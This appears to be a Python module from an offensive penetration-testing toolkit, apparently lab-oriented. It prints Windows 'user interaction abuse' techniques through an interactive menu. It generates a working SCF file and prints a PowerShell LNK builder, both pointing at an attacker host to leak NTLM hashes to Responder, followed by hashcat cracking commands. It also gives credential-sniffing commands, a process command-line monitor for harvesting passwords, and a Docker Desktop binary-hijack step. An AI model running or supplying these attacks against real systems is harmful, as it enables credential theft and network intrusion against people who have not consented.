import subprocess
from pathlib import Path

from core.attacker import (
    resolve_lhost
)

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
W_BOLD = '\033[1m'


# =========================================================
# HELPERS
# =========================================================

def box(cmd):

    print(
        f"{G}"
        f"┌──────────────────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f"{cmd}"
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────┘{W}\n"
    )


# =========================================================
# TRAFFIC CAPTURE / SNIFFING
# =========================================================

def traffic_capture():

    print(
        f"\n{W_BOLD}"
        f"[*] TRAFFIC CAPTURE / SNIFFING{W}\n"
    )

    print(
        f"{Y}[i]{W} "
        f"Wireshark"
    )

    box(
        "wireshark"
    )

    print(
        f"{Y}[i]{W} "
        f"tcpdump"
    )

    box(
        "sudo tcpdump -i tun0"
    )

    print(
        f"{Y}[i]{W} "
        f"net-creds"
    )

    box(
        "sudo net-creds -i tun0"
    )

    print(
        f"{Y}[i]{W} "
        f"Look for:"
    )

    print("    FTP")
    print("    HTTP Basic Auth")
    print("    SMB")
    print("    LDAP")

    print(
        f"\n{Y}[i]{W} "
        f"Wireshark may work as low-priv user"
    )

    print(
        f"{Y}[i]{W} "
        f"Npcap admin restriction is disabled by default"
    )


# =========================================================
# PROCESS COMMAND MONITORING
# =========================================================

def process_monitor():

    print(
        f"\n{W_BOLD}"
        f"[*] PROCESS COMMAND MONITORING{W}\n"
    )

    box(
        "while($true){$process = Get-WmiObject Win32_Process | Select-Object CommandLine; Start-Sleep 1; $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine; Compare-Object -ReferenceObject $process -DifferenceObject $process2}"
    )

    print(
        f"{Y}[i]{W} "
        f"Look for credentials in:"
    )

    print("    net use")
    print("    sqlcmd")
    print("    backup scripts")
    print("    scheduled tasks")
    print("    runas")

    print(
        f"\n{Y}[i]{W} "
        f"Example:"
    )

    print(
        "    net use T: \\\\sql02\\backups /user:inlanefreight\\sqlsvc My4dm1nP@s5w0Rd"
    )


# =========================================================
# VULNERABLE SERVICES / APPLICATIONS
# =========================================================

def vulnerable_services():

    print(
        f"\n{W_BOLD}"
        f"[*] VULNERABLE SERVICES / APPLICATIONS{W}\n"
    )

    print(
        f"{Y}[i]{W} "
        f"Docker Desktop CVE-2019-15752"
    )

    box(
        'icacls "C:\\ProgramData\\DockerDesktop\\version-bin"'
    )

    print(
        f"{Y}[i]{W} "
        f"If BUILTIN\\Users has write access:"
    )

    print("    place malicious executable")
    print("    wait for docker login")
    print("    or Docker Desktop restart")

    print(
        f"\n{Y}[i]{W} "
        f"Interesting files searched by Docker:"
    )

    print("    docker-credential-wincred.exe")
    print("    docker-credential-wincred.bat")


# =========================================================
# SCF FILE
# =========================================================

def generate_scf(args):

    lhost = resolve_lhost(args)

    try:

        name = input(
            f"\n{B}filename{W}> "
        ).strip()

    except (KeyboardInterrupt, EOFError):

        print()

        return

    if not name:

        name = "@Inventory"

    content = f"""[Shell]
Command=2
IconFile=\\\\{lhost}\\share\\legit.ico
[Taskbar]
Command=ToggleDesktop
"""

    path = (
        Path.cwd() /
        f"{name}.scf"
    )

    path.write_text(
        content
    )

    print(
        f"\n{G}[+]{W} "
        f"Generated:"
    )

    print(f"  {path}")

    print(
        f"\n{B}[*]{W} "
        f"START RESPONDER\n"
    )

    box(
        "sudo responder -I tun0"
    )

    print(
        f"{Y}[i]{W} "
        f"Place SCF file on writable share"
    )

    print(
        f"{Y}[i]{W} "
        f"Wait for user to browse folder"
    )

    print(
        f"\n{Y}[i]{W} "
        f"Crack hash:"
    )

    box(
        "hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt"
    )


# =========================================================
# LNK FILE
# =========================================================

def generate_lnk(args):

    lhost = resolve_lhost(args)

    print(
        f"\n{W_BOLD}"
        f"[*] MALICIOUS LNK FILE{W}\n"
    )

    print(
        f"{Y}[i]{W} "
        f"Run on target:\n"
    )

    cmd = f"""
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\\legit.lnk")
$lnk.TargetPath = "\\\\{lhost}\\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\\system32\\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
"""

    print(cmd)

    print(
        f"\n{B}[*]{W} "
        f"START RESPONDER\n"
    )

    box(
        "sudo responder -I tun0"
    )

    print(
        f"{Y}[i]{W} "
        f"Place LNK file on writable share"
    )

    print(
        f"{Y}[i]{W} "
        f"Wait for user interaction"
    )

    print(
        f"\n{Y}[i]{W} "
        f"Crack hash:"
    )

    box(
        "hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt"
    )


# =========================================================
# MAIN
# =========================================================

def run(data=None, cred=None, args=None):

    while True:

        print(
            f"\n{W_BOLD}"
            f"[*] USER INTERACTION ABUSE{W}\n"
        )

        print(
            f"  {B}[1]{W} "
            f"Traffic capture / sniffing"
        )

        print(
            f"  {B}[2]{W} "
            f"Process command-line monitoring"
        )

        print(
            f"  {B}[3]{W} "
            f"Vulnerable services/applications"
        )

        print(
            f"  {B}[4]{W} "
            f"Malicious SCF files"
        )

        print(
            f"  {B}[5]{W} "
            f"Malicious LNK files"
        )

        print(
            f"  {B}[0]{W} "
            f"Back"
        )

        try:

            choice = input(
                f"\n{B}select{W}> "
            ).strip()

        except (KeyboardInterrupt, EOFError):

            print()

            return

        # =================================================
        # TRAFFIC CAPTURE
        # =================================================

        if choice == "1":

            traffic_capture()

        # =================================================
        # PROCESS COMMANDS
        # =================================================

        elif choice == "2":

            process_monitor()

        # =================================================
        # VULNERABLE SERVICES/APPS
        # =================================================

        elif choice == "3":

            vulnerable_services()

        # =================================================
        # SCF
        # =================================================

        elif choice == "4":

            generate_scf(args)

        # =================================================
        # LNK
        # =================================================

        elif choice == "5":

            generate_lnk(args)

        # =================================================
        # BACK
        # =================================================

        elif choice == "0":

            return